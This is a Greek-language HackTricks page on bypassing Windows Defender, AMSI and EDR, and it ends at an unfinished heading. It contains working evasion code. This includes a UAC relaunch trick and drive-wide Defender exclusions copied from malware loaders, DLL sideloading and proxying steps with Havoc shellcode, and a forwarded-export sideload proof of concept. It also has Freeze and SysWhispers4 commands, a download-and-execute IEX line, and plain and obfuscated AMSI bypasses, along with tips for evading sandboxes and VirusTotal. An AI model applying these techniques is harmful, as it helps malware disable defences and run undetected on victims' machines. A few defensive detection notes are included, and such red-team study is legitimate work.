# Παράκαμψη Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από τον** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή του Defender

- [defendnot](https://github.com/es3n1n/defendnot): Εργαλείο για τη διακοπή λειτουργίας του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Εργαλείο για τη διακοπή λειτουργίας του Windows Defender, προσποιούμενο ότι είναι άλλο AV.
- [Απενεργοποίηση του Defender αν είστε admin](basic-powershell-for-pentesters/README.md)

### Δόλωμα UAC τύπου installer πριν από την παραποίηση του Defender

Οι δημόσιοι loaders που μεταμφιέζονται σε cheats παιχνιδιών συχνά διανέμονται ως unsigned installers Node.js/Nexe, οι οποίοι πρώτα **ζητούν από τον χρήστη δικαιώματα ανύψωσης** και μόνο τότε εξουδετερώνουν το Defender. Η διαδικασία είναι απλή:

1. Ελέγχει αν υπάρχει περιβάλλον διαχειριστή με την εντολή `net session`. Η εντολή επιτυγχάνει μόνο όταν ο χρήστης που την εκτελεί έχει δικαιώματα admin, επομένως η αποτυχία υποδεικνύει ότι ο loader εκτελείται ως standard user.
2. Επανεκκινεί αμέσως τον εαυτό του με το ρήμα `RunAs`, ώστε να εμφανιστεί η αναμενόμενη προτροπή συγκατάθεσης UAC, διατηρώντας παράλληλα την αρχική γραμμή εντολών.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Τα θύματα ήδη πιστεύουν ότι εγκαθιστούν «cracked» λογισμικό, οπότε συνήθως αποδέχονται την προτροπή, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.<sup>[[26]](#references)</sup>

### Εξαιρέσεις `MpPreference` για κάθε γράμμα μονάδας

Μόλις αποκτήσουν αυξημένα δικαιώματα, οι αλυσίδες τύπου GachiLoader μεγιστοποιούν τα τυφλά σημεία του Defender, αντί να απενεργοποιούν εντελώς την υπηρεσία. Αρχικά, ο loader τερματίζει το GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και στη συνέχεια προσθέτει **εξαιρετικά ευρείες εξαιρέσεις**, ώστε να μην είναι δυνατή η σάρωση κάθε προφίλ χρήστη, καταλόγου συστήματος και αφαιρούμενου δίσκου:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Βασικές παρατηρήσεις:

- Ο βρόχος διατρέχει κάθε προσαρτημένο σύστημα αρχείων (D:\, E:\, USB sticks κ.λπ.), επομένως **οποιοδήποτε μελλοντικό payload αποθηκευτεί οπουδήποτε στον δίσκο αγνοείται**.
- Ο αποκλεισμός της επέκτασης `.sys` είναι προληπτικός — οι attackers διατηρούν τη δυνατότητα να φορτώσουν αργότερα unsigned drivers χωρίς να χρειαστεί να πειράξουν ξανά το Defender.
- Όλες οι αλλαγές γίνονται στο `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας στα επόμενα στάδια να επιβεβαιώσουν ότι οι εξαιρέσεις παραμένουν ή να τις επεκτείνουν χωρίς να προκαλέσουν ξανά το UAC.

Επειδή δεν διακόπτεται καμία υπηρεσία του Defender, οι απλοϊκοί έλεγχοι κατάστασης εξακολουθούν να αναφέρουν «το antivirus είναι ενεργό», παρόλο που η επιθεώρηση σε πραγματικό χρόνο δεν ελέγχει ποτέ αυτές τις διαδρομές.<sup>[[26]](#references)</sup>

## **Μεθοδολογία αποφυγής AV**

Επί του παρόντος, τα AV χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι: static detection, dynamic analysis και, για τα πιο προηγμένα EDR, behavioural analysis.

### **Static detection**

Το Static detection επιτυγχάνεται με την επισήμανση γνωστών κακόβουλων strings ή byte arrays σε ένα binary ή script, καθώς και με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. περιγραφή αρχείου, όνομα εταιρείας, digital signatures, icon, checksum κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών public tools μπορεί να σε κάνει να εντοπιστείς ευκολότερα, καθώς πιθανότατα έχουν ήδη αναλυθεί και επισημανθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι να παρακάμψεις αυτού του είδους τον εντοπισμό:

- **Encryption**

Αν κάνεις encrypt το binary, το AV δεν θα μπορεί να εντοπίσει το πρόγραμμά σου, αλλά θα χρειαστείς κάποιον loader για να το αποκρυπτογραφήσει και να το εκτελέσει στη μνήμη.

- **Obfuscation**

Μερικές φορές αρκεί να αλλάξεις κάποια strings στο binary ή το script σου για να περάσει απαρατήρητο από το AV, αλλά αυτό μπορεί να είναι χρονοβόρο, ανάλογα με το τι προσπαθείς να κάνεις obfuscate.

- **Custom tooling**

Αν αναπτύξεις τα δικά σου tools, δεν θα υπάρχουν γνωστά κακόβουλα signatures, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για να ελέγξεις το static detection του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ουσιαστικά χωρίζει το αρχείο σε πολλαπλά τμήματα και ζητά από το Defender να σαρώσει το καθένα ξεχωριστά. Έτσι, μπορεί να σου δείξει ακριβώς ποια strings ή bytes στο binary σου έχουν επισημανθεί.

Συνιστώ ανεπιφύλακτα να δεις αυτήν την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με την πρακτική αποφυγή AV.

### **Dynamic analysis**

Dynamic analysis είναι όταν το AV εκτελεί το binary σου σε sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια αποκρυπτογράφησης και ανάγνωσης των κωδικών πρόσβασης του browser σου, εκτέλεση minidump στο LSASS κ.λπ.). Αυτό το κομμάτι μπορεί να είναι λίγο πιο περίπλοκο, αλλά υπάρχουν ορισμένα πράγματα που μπορείς να κάνεις για να αποφύγεις τα sandboxes.

- **Αναμονή πριν από την εκτέλεση** Ανάλογα με τον τρόπο υλοποίησης, μπορεί να είναι ένας εξαιρετικός τρόπος παράκαμψης του dynamic analysis του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν αρχεία, ώστε να μην διακόπτουν τη ροή εργασίας του χρήστη, επομένως οι μεγάλες περίοδοι αναμονής μπορούν να εμποδίσουν την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά AV sandboxes μπορούν απλώς να παραλείψουν την αναμονή, ανάλογα με τον τρόπο υλοποίησής τους.
- **Έλεγχος των πόρων του μηχανήματος** Τα sandboxes έχουν συνήθως πολύ περιορισμένους πόρους (π.χ. < 2GB RAM), διαφορετικά θα μπορούσαν να επιβραδύνουν το μηχάνημα του χρήστη. Μπορείς επίσης να γίνεις πολύ δημιουργικός εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων — δεν θα είναι όλα υλοποιημένα στο sandbox.
- **Έλεγχοι ειδικοί για το μηχάνημα** Αν θέλεις να στοχεύσεις έναν χρήστη του οποίου ο σταθμός εργασίας είναι συνδεδεμένος στο domain "contoso.local", μπορείς να ελέγξεις το domain του υπολογιστή για να δεις αν ταιριάζει με αυτό που έχεις ορίσει. Αν δεν ταιριάζει, μπορείς να τερματίσεις το πρόγραμμά σου.

Αποδεικνύεται ότι το όνομα υπολογιστή του Microsoft Defender Sandbox είναι HAL9TH. Επομένως, μπορείς να ελέγξεις το όνομα του υπολογιστή στο malware σου πριν από την εκτέλεση. Αν το όνομα είναι HAL9TH, σημαίνει ότι βρίσκεσαι μέσα στο sandbox του Defender, οπότε μπορείς να τερματίσεις το πρόγραμμά σου.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμη πολύ καλές συμβουλές από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> κανάλι #malware-dev</p></figcaption></figure>

Όπως είπαμε και προηγουμένως σε αυτήν την ανάρτηση, τα **public tools** τελικά **εντοπίζονται**, επομένως πρέπει να αναρωτηθείς το εξής:

Για παράδειγμα, αν θέλεις να κάνεις dump το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσεις το mimikatz**; Ή θα μπορούσες να χρησιμοποιήσεις κάποιο άλλο, λιγότερο γνωστό project που κάνει επίσης dump το LSASS;

Η σωστή απάντηση είναι πιθανότατα η δεύτερη. Για παράδειγμα, το mimikatz είναι πιθανότατα ένα από τα πιο επισημασμένα malware από τα AV και EDR, αν όχι το πιο επισημασμένο. Παρόλο που το ίδιο το project είναι εξαιρετικό, είναι επίσης εφιάλτης να το χρησιμοποιήσεις για να παρακάμψεις τα AV, επομένως αναζήτησε εναλλακτικές λύσεις για αυτό που προσπαθείς να πετύχεις.

> [!TIP]
> Όταν τροποποιείς τα payloads σου για αποφυγή εντοπισμού, φρόντισε να **απενεργοποιήσεις την αυτόματη υποβολή δειγμάτων** στο Defender και, σε παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΑΖΕΙΣ ΣΤΟ VIRUSTOTAL** αν στόχος σου είναι η μακροπρόθεσμη αποφυγή εντοπισμού. Αν θέλεις να ελέγξεις αν ένα συγκεκριμένο AV εντοπίζει το payload σου, εγκατέστησέ το σε ένα VM, προσπάθησε να απενεργοποιήσεις την αυτόματη υποβολή δειγμάτων και δοκίμασέ το εκεί μέχρι να μείνεις ικανοποιημένος με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατό, να **προτιμάς πάντα τη χρήση DLLs για αποφυγή εντοπισμού**. Από την εμπειρία μου, τα αρχεία DLL συνήθως **εντοπίζονται και αναλύονται πολύ λιγότερο**, οπότε πρόκειται για ένα πολύ απλό τέχνασμα που μπορείς να χρησιμοποιήσεις για να αποφύγεις τον εντοπισμό σε ορισμένες περιπτώσεις (αν το payload σου μπορεί να εκτελεστεί ως DLL, φυσικά).

Όπως βλέπουμε σε αυτήν την εικόνα, ένα DLL Payload από το Havoc έχει ποσοστό εντοπισμού 4/26 στο antiscan.me, ενώ το EXE payload έχει ποσοστό εντοπισμού 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>σύγκριση στο antiscan.me ενός κανονικού Havoc EXE payload με ένα κανονικό Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείς να χρησιμοποιήσεις με αρχεία DLL για να γίνεις πολύ πιο stealthy.

## DLL Sideloading & Proxying

Το **DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιεί ο loader, τοποθετώντας δίπλα-δίπλα τόσο την εφαρμογή-θύμα όσο και τα κακόβουλα payloads.

Μπορείς να εντοπίσεις προγράμματα που είναι ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο PowerShell script:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων μέσα στο "C:\Program Files\\" που είναι ευάλωτα σε DLL hijacking, καθώς και τα DLL αρχεία που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας προγράμματα που επιτρέπουν DLL Hijacking/Sideloading**. Αν γίνει σωστά, αυτή η τεχνική είναι αρκετά stealthy, αλλά αν χρησιμοποιήσετε προγράμματα που είναι δημόσια γνωστό ότι επιτρέπουν DLL Sideloading, μπορεί να εντοπιστείτε εύκολα.

Απλώς το να τοποθετήσετε ένα κακόβουλο DLL με το όνομα που περιμένει να φορτώσει ένα πρόγραμμα δεν αρκεί για να φορτώσει το payload σας, καθώς το πρόγραμμα περιμένει να υπάρχουν συγκεκριμένες συναρτήσεις μέσα σε αυτό το DLL. Για να αντιμετωπίσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) του [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και την αρχική DLL μετονομασμένη.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (κωδικοποιημένο με [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν ποσοστό ανίχνευσης 0/26 στο [antiscan.me](https://antiscan.me)! Θα το θεωρούσα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Συνιστώ ανεπιφύλακτα** να παρακολουθήσετε το [twitch VOD του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading, καθώς και το [βίντεο του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), για να μάθετε περισσότερα σε βάθος σχετικά με όσα συζητήσαμε.

### Κατάχρηση Forwarded Exports (ForwardSideLoading)

Οι μονάδες Windows PE μπορούν να εξάγουν συναρτήσεις που στην πραγματικότητα είναι «forwarders»: αντί να δείχνει σε κώδικα, η καταχώριση export περιέχει μια συμβολοσειρά ASCII της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει το export, ο Windows loader θα:

- Φορτώσει το `TargetDll`, αν δεν έχει ήδη φορτωθεί
- Επιλύσει το `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να γνωρίζετε:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από τον προστατευμένο χώρο ονομάτων KnownDLLs (π.χ. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον κατάλογο της μονάδας που εκτελεί την προώθηση.

Έτσι δημιουργείται ένα έμμεσο primitive sideloading: βρείτε ένα υπογεγραμμένο DLL που εξάγει μια συνάρτηση προωθημένη σε όνομα μονάδας που δεν είναι KnownDLL και τοποθετήστε το στον ίδιο κατάλογο με ένα DLL υπό τον έλεγχο του επιτιθέμενου, το οποίο έχει ακριβώς το όνομα της προωθούμενης μονάδας-στόχου. Όταν κληθεί το forwarded export, ο loader επιλύει την προώθηση και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.<sup>[[13]](#references)</sup>

Παράδειγμα που παρατηρήθηκε στα Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` δεν είναι KnownDLL, επομένως εντοπίζεται μέσω της κανονικής σειράς αναζήτησης.

PoC (αντιγραφή-επικόλληση):
1) Αντιγράψτε το υπογεγραμμένο DLL συστήματος σε έναν φάκελο με δυνατότητα εγγραφής
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Αρκεί ένα ελάχιστο DllMain για την εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε τη συνάρτηση που προωθείται για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Ενεργοποιήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed συμπεριφορά:
- Το rundll32 (υπογεγραμμένο) φορτώνει το side-by-side `keyiso.dll` (υπογεγραμμένο)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί την προώθηση προς το `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια, ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Αν δεν έχει υλοποιηθεί το `SetAuditingInterface`, θα εμφανιστεί σφάλμα «missing API» μόνο αφού έχει ήδη εκτελεστεί το `DllMain`

Συμβουλές για το hunting:
- Εστιάστε σε forwarded exports όπου το module-στόχος δεν είναι KnownDLL. Τα KnownDLLs παρατίθενται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε τον κατάλογο forwarder των Windows 11 για να αναζητήσετε υποψήφιες επιλογές: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ιδέες για ανίχνευση/άμυνα:
- Παρακολουθείτε τα LOLBins (π.χ. rundll32.exe) που φορτώνουν υπογεγραμμένα DLL από μη συστημικές διαδρομές και στη συνέχεια φορτώνουν μη-KnownDLLs με το ίδιο βασικό όνομα από τον ίδιο κατάλογο
- Ειδοποιείτε για αλυσίδες διεργασιών/μονάδων όπως: `rundll32.exe` → μη συστημικό `keyiso.dll` → `NCRYPTPROV.dll` σε διαδρομές εγγράψιμες από χρήστες
- Εφαρμόζετε πολιτικές ακεραιότητας κώδικα (WDAC/AppLocker) και απαγορεύετε εγγραφή και εκτέλεση στους καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Το Freeze είναι ένα toolkit payload για παράκαμψη των EDR με χρήση suspended processes, direct syscalls και εναλλακτικών μεθόδων εκτέλεσης`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealthy τρόπο.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Το Evasion είναι απλώς ένα παιχνίδι γάτας και ποντικιού· ό,τι λειτουργεί σήμερα μπορεί να εντοπιστεί αύριο, οπότε μην βασίζεστε ποτέ σε ένα μόνο εργαλείο. Αν είναι δυνατό, δοκιμάστε να συνδυάσετε πολλές τεχνικές evasion.

## Άμεσα/Έμμεσα Syscalls & Επίλυση SSN (SysWhispers4)

Τα EDR συχνά τοποθετούν **inline hooks σε user mode** στα syscall stubs του `ntdll.dll`. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και μεταβαίνουν σε kernel mode χωρίς να εκτελούν το hooked export entrypoint.<sup>[[32]](#references)</sup>

**Επιλογές κλήσης:**
- **Direct (embedded)**: εκπέμπει μια εντολή `syscall`/`sysenter`/`SVC #0` στο generated stub (δεν καλείται export του `ntdll`).
- **Indirect**: μεταβαίνει σε ένα υπάρχον `syscall` gadget μέσα στο `ntdll`, ώστε η μετάβαση στον kernel να φαίνεται ότι ξεκινά από το `ntdll` (χρήσιμο για heuristic evasion)· το **randomized indirect** επιλέγει ένα gadget από ένα pool σε κάθε κλήση.
- **Egg-hunt**: αποφεύγει την ενσωμάτωση της στατικής ακολουθίας opcode `0F 05` στον δίσκο· εντοπίζει μια ακολουθία syscall κατά την εκτέλεση.

**Στρατηγικές επίλυσης SSN ανθεκτικές στα hooks:**
- **FreshyCalls (VA sort)**: συμπεραίνει τα SSN ταξινομώντας τα syscall stubs κατά virtual address, αντί να διαβάζει τα bytes των stubs.
- **SyscallsFromDisk**: κάνει map ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάζει τα SSN από το `.text` και μετά κάνει unmap (παρακάμπτει όλα τα in-memory hooks).
- **RecycledGate**: συνδυάζει την εξαγωγή SSN μέσω ταξινόμησης VA με την επικύρωση opcode όταν ένα stub είναι καθαρό· αν έχει υποστεί hook, χρησιμοποιεί ως εναλλακτική την εξαγωγή μέσω VA.
- **HW Breakpoint**: θέτει το DR0 στην εντολή `syscall` και χρησιμοποιεί ένα VEH για να καταγράψει το SSN από το `EAX` κατά την εκτέλεση, χωρίς να αναλύει hooked bytes.

Παράδειγμα χρήσης του SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέπει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώσουν μόνο **αρχεία στον δίσκο**, οπότε αν μπορούσες με κάποιον τρόπο να εκτελέσεις payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε επαρκή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη στα ακόλουθα στοιχεία των Windows.

- Έλεγχος λογαριασμού χρήστη ή UAC (ανύψωση δικαιωμάτων EXE, COM, MSI ή εγκατάστασης ActiveX)
- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Μακροεντολές Office VBA

Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των scripts, εκθέτοντας το περιεχόμενό τους σε μορφή χωρίς κρυπτογράφηση και χωρίς συσκότιση.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα προκαλέσει την ακόλουθη ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε ότι προσθέτει το `amsi:` και στη συνέχεια τη διαδρομή προς το εκτελέσιμο από το οποίο εκτελέστηκε το script, στην προκειμένη περίπτωση το powershell.exe

Δεν αφήσαμε κανένα αρχείο στον δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε στη μνήμη λόγω του AMSI.

Επιπλέον, από την έκδοση **.NET 4.8** και μετά, ο κώδικας C# περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και τη χρήση του `Assembly.Load(byte[])` για φόρτωση και εκτέλεση στη μνήμη. Γι' αυτό συνιστάται η χρήση παλαιότερων εκδόσεων του .NET (όπως η 4.7.2 ή παλαιότερη) για εκτέλεση στη μνήμη, αν θέλετε να παρακάμψετε το AMSI.

Υπάρχουν μερικοί τρόποι παράκαμψης του AMSI:

- **Συσκότιση**

Επειδή το AMSI βασίζεται κυρίως σε στατικές ανιχνεύσεις, η τροποποίηση των scripts που επιχειρείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος αποφυγής του εντοπισμού.

Ωστόσο, το AMSI μπορεί να αποσυσκοτίσει scripts ακόμη κι αν έχουν πολλά επίπεδα συσκότισης, επομένως η συσκότιση μπορεί να είναι κακή επιλογή, ανάλογα με τον τρόπο που γίνεται. Αυτό σημαίνει ότι η αποφυγή του εντοπισμού δεν είναι τόσο απλή. Παρότι, κάποιες φορές, αρκεί να αλλάξετε μερικά ονόματα μεταβλητών, οπότε αυτό εξαρτάται από το πόσο έχει επισημανθεί κάτι.

- **AMSI Bypass**

Καθώς το AMSI υλοποιείται με τη φόρτωση ενός DLL στη διεργασία του powershell (καθώς και των cscript.exe, wscript.exe κ.λπ.), είναι εύκολο να παραποιηθεί, ακόμη και όταν εκτελείται ως μη προνομιούχος χρήστης. Λόγω αυτού του ελαττώματος στην υλοποίηση του AMSI, οι ερευνητές έχουν βρει πολλούς τρόπους παράκαμψης της σάρωσης AMSI.

**Εξαναγκασμός σφάλματος**

Ο εξαναγκασμός αποτυχίας της αρχικοποίησης του AMSI (amsiInitFailed) έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για την τρέχουσα διεργασία. Αυτό αποκαλύφθηκε αρχικά από τον [Matt Graeber](https://twitter.com/mattifestation), και η Microsoft ανέπτυξε μια υπογραφή για να αποτρέψει την ευρύτερη χρήση του.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Αρκούσε μία μόνο γραμμή κώδικα PowerShell για να καταστήσει το AMSI άχρηστο στην τρέχουσα διεργασία PowerShell. Αυτή η γραμμή έχει, φυσικά, επισημανθεί από το ίδιο το AMSI, επομένως απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Ακολουθεί ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Να έχεις υπόψη ότι αυτή η ανάρτηση πιθανότατα θα επισημανθεί μόλις δημοσιευτεί, επομένως δεν θα πρέπει να δημοσιεύσεις κώδικα αν σκοπεύεις να παραμείνεις μη ανιχνεύσιμος.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για τη σάρωση των δεδομένων εισόδου που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κωδικό E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα είναι 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διάβασε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές για την παράκαμψη του AMSI με powershell. Δες [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθεις περισσότερα σχετικά με αυτές.

### Αποκλεισμός του AMSI με αποτροπή φόρτωσης του amsi.dll (hook στο LdrLoadDll)

